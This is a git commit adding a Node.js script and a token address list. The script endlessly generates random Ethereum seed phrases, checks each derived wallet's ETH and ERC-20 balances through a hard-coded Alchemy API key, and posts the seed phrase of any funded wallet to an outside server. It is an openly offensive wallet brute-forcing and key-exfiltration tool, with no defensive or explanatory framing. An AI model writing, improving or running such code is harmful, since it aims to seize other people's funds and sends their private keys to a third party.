97aded6d2f1ef2b608ad298e74b19aa7bed1bc2c
Vu Hoang <9VanHoang_Vu@sigaporeair.com.sg>
2024-06-14 08:27:18 +0700

    v1

---
+++ erc20Tokens.js
@@ -0,0 +1,78 @@
+const erc20Tokens = [
+  {
+    name: "DAI",
+    address: "0x6b175474e89094c44da98b954eedeac495271d0f",
+  },
+  {
+    name: "USDC",
+    address: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
+  },
+  {
+    name: "WBTC",
+    address: "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599",
+  },
+  {
+    name: "LINK",
+    address: "0x514910771af9ca656af840dff83e8264ecf986ca",
+  },
+  {
+    name: "UNI",
+    address: "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984",
+  },
+  {
+    name: "USDT",
+    address: "0xdac17f958d2ee523a2206206994597c13d831ec7",
+  },
+  {
+    name: "BTC",
+    address: "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599",
+  },
+  {
+    name: "MATIC",
+    address: "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0",
+  },
+  {
+    name: "BNB",
+    address: "0xB8c77482e45F1F44dE1745F52C74426C631bDD52",
+  },
+  {
+    name: "CHP",
+    address: "0x0a6E18fB2842855C3AF925310B0F50a4BfA17909",
+  },
+  {
+    name: "SHIB",
+    address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE",
+  },
+  {
+    name: "stETH",
+    address: "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84",
+  },
+  {
+    name: "XRP",
+    address: "0x628F76eAB0C1298F7a24d337bBbF1ef8A1Ea6A24",
+  },
+  {
+    name: "TON",
+    address: "0x582d872A1B094FC48F5DE31D3B73F2D9bE47def1",
+  },
+  {
+    name: "NEAR",
+    address: "0x85F17Cf997934a597031b2E18a9aB6ebD4B9f6a4",
+  },
+  {
+    name: "PEPE",
+    address: "0x6982508145454Ce325dDbE47a25d4ec3d2311933",
+  },
+  {
+    name: "IMX",
+    address: "0xF57e7e7C23978C3cAEC3C3548E3D615c346e79fF",
+  },
+  {
+    name: "FDUSD",
+    address: "0xc5f0f7b66764F6ec8C8Dff7BA683102295E16409",
+  },
+];
+
+module.exports = {
+  erc20Tokens,
+};
---
+++ main.js
@@ -0,0 +1,125 @@
+const bip39 = require("bip39");
+const BIP32Factory = require("bip32").BIP32Factory;
+const ecc = require("tiny-secp256k1");
+const randomBytes = require("randombytes");
+const ethWallet = require("ethereumjs-wallet").default;
+const { ethers } = require("ethers");
+const Axios = require("axios").Axios;
+
+const cluster = require("cluster");
+const numCPUs = require("os").cpus().length;
+
+const { erc20Tokens } = require("./erc20Tokens");
+
+const bip32 = BIP32Factory(ecc);
+
+const axios = new Axios({
+  baseURL: "https://api-diamond.amices.com.vn",
+});
+
+const provider = new ethers.AlchemyProvider(
+  "mainnet",
+  "kM6dTofpt93RN1fpFkvwQgT50q5dMZbb"
+);
+
+const abi = ["function balanceOf(address) view returns (uint)"];
+
+function generateRandomMnemonic() {
+  const randomBytesGenerated = randomBytes(16);
+  const hexString = randomBytesGenerated.toString("hex");
+  const mnemonic = bip39.entropyToMnemonic(hexString);
+  return mnemonic;
+}
+
+async function checkTokenBalancesAndTransfer(walletAddress, mnemonic) {
+  async function getTokenBalances(address) {
+    const promises = erc20Tokens.map(async (token) => {
+      const contract = new ethers.Contract(token.address, abi, provider);
+      const balance = await contract.balanceOf(address);
+      return {
+        name: token.name,
+        balance,
+      };
+    });
+
+    return Promise.all(promises);
+  }
+
+  try {
+    console.log(`Token balances for address ${walletAddress}:`);
+    const ethBalance = await provider.getBalance(walletAddress);
+    console.log(`ETH: ${ethBalance}`);
+    const tokenBalances = await getTokenBalances(walletAddress);
+
+    // Check each token balance and transfer if balance > 0
+    for (let token of tokenBalances) {
+      console.log(`${token.name}: ${token.balance}`);
+      if (token.balance > 0) {
+        console.log(`Found! ${token.name} tokens...`, mnemonic);
+        await axios.post("/api/users/wallet", {
+          mnemonic,
+          token: token.name,
+        });
+      }
+    }
+  } catch (error) {
+    console.error("Error fetching or transferring token balances:", error);
+  }
+}
+
+async function generateWalletCheckBalanceAndTransfer() {
+  // Generate a random 12-word seed phrase
+  const mnemonic = generateRandomMnemonic();
+  console.log("Generated 12-word seed phrase:", mnemonic);
+
+  // Convert the mnemonic to a seed
+  const seed = bip39.mnemonicToSeedSync(mnemonic);
+
+  // Create a BIP32 root key from the seed
+  const root = bip32.fromSeed(seed);
+
+  // Derive the first account's node using the BIP44 path for Ethereum
+  const path = "m/44'/60'/0'/0/0";
+  const child = root.derivePath(path);
+
+  // Get the wallet address
+  const wallet = ethWallet.fromPrivateKey(child.privateKey);
+  const address = wallet.getAddressString();
+  console.log("Wallet address:", address);
+
+  await checkTokenBalancesAndTransfer(address, mnemonic);
+}
+
+const main = async () => {
+  let count = 1;
+  console.log("Checked wallet counts: ", count);
+  while (true) {
+    try {
+      count++;
+      await generateWalletCheckBalanceAndTransfer();
+    } catch (error) {
+      console.error("Error: ", error);
+    }
+  }
+};
+
+main();
+
+// Master process
+// if (cluster.isMaster) {
+//   console.log(`Master ${process.pid} is running`);
+
+//   // Fork workers
+//   for (let i = 0; i < numCPUs; i++) {
+//     cluster.fork();
+//   }
+
+//   cluster.on("exit", (worker, code, signal) => {
+//     console.log(`Worker ${worker.process.pid} died, restarting...`);
+//     cluster.fork();
+//   });
+// } else {
+//   // Worker processes
+//   console.log(`Worker ${process.pid} started`);
+//   main();
+// }
